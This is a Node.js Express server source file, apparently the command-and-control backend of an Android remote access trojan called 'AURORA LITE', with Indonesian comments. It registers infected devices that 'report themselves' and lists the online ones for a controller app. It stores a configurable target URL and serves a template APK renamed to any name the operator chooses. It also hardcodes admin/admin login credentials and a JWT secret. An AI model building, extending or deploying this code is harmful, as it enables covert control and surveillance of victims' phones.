const express = require('express');
const http = require('http');
const path = require('path');
const fs = require('fs');
const jwt = require('jsonwebtoken');

const app = express();
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));

const PORT = process.env.SERVER_PORT || 4732;
const JWT_SECRET = "AURORA_LITE_SECRET_KEY_999";
const CONFIG_PATH = path.join(__dirname, 'config.json');

const server = http.createServer(app);

// Database Sederhana (In-Memory)
let activeDevices = [];
let currentTargetUrl = "https://rioomd.my.id";

// ================== KONFIGURASI TARGET URL ==================
function getTargetUrl() {
  if (fs.existsSync(CONFIG_PATH)) {
    try {
      const data = JSON.parse(fs.readFileSync(CONFIG_PATH, 'utf8'));
      return data.targetUrl || currentTargetUrl;
    } catch (e) { return currentTargetUrl; }
  }
  return currentTargetUrl;
}

function saveTargetUrl(url) {
  currentTargetUrl = url;
  fs.writeFileSync(CONFIG_PATH, JSON.stringify({ targetUrl: url }, null, 2));
}

// ================== API LOGIN ==================
app.post('/api/login', (req, res) => {
  const { username, password } = req.body;
  if (!username || !password) return res.status(400).json({ status: false, message: 'Isi Username/Password' });
  
  if (username === 'admin' && password === 'admin') {
    const token = jwt.sign({ username, role: 'admin' }, JWT_SECRET, { expiresIn: '30d' });
    return res.json({ status: true, token, role: 'admin' });
  }
  res.status(401).json({ status: false, message: 'Username/Password salah' });
});

// ================== API DYNAMIC TARGET URL ==================
app.post('/api/set-target', (req, res) => {
  const { url } = req.body;
  if (!url) return res.status(400).json({ status: false, message: 'URL kosong' });
  saveTargetUrl(url);
  console.log(`[CONFIG] Target URL updated to: ${url}`);
  res.json({ status: true, url });
});

app.get('/api/get-target', (req, res) => {
  res.send(getTargetUrl());
});

// ================== API HTTP RAT (PENGGANTI WEBSOCKET) ==================
// 1. APK Target nembak ini buat "Lapor Diri"
app.post('/api/device/register', (req, res) => {
  const { device_id, name, os, battery } = req.body;
  if (!device_id) return res.status(400).json({ status: false });

  const existing = activeDevices.find(d => d.id === device_id);
  if (existing) {
    existing.last_seen = Date.now();
    existing.battery = battery;
  } else {
    activeDevices.push({
      id: device_id,
      name: name || 'Unknown',
      os: os || 'Android',
      battery: battery || 100,
      last_seen: Date.now()
    });
    console.log(`[RAT HTTP] Device Connected: ${name}`);
  }
  res.json({ status: true });
});

// 2. Flutter nembak ini buat "Cek Siapa Aja Device yang Online"
app.get('/api/device/list', (req, res) => {
  // Bersihin device yang udah gk nembak > 10 detik
  const now = Date.now();
  activeDevices = activeDevices.filter(d => now - d.last_seen < 10000); 
  res.json({ devices: activeDevices });
});

// ================== API BUILD APK ==================
app.get('/api/build-apk', (req, res) => {
  const { name } = req.query;
  if (!name) return res.status(400).send('Nama APK kosong');
  const apkPath = path.join(__dirname, 'template.apk');

  if (!fs.existsSync(apkPath)) return res.status(404).send('File template.apk tidak ada');
  const stats = fs.statSync(apkPath);
  if (stats.size === 0) return res.status(500).send('File template.apk kosong / 0B');

  console.log(`[SUKSES] Mengirim ${name}.apk`);
  res.setHeader('Content-Type', 'application/vnd.android.package-archive');
  res.setHeader('Content-Disposition', `attachment; filename="${name}.apk"`);
  res.setHeader('Content-Length', stats.size);
  
  const stream = fs.createReadStream(apkPath);
  stream.pipe(res);
});

server.listen(PORT, '0.0.0.0', () => {
  console.log(`🚀 [AURORA LITE - HTTP MODE] Running on port ${PORT}`);
});
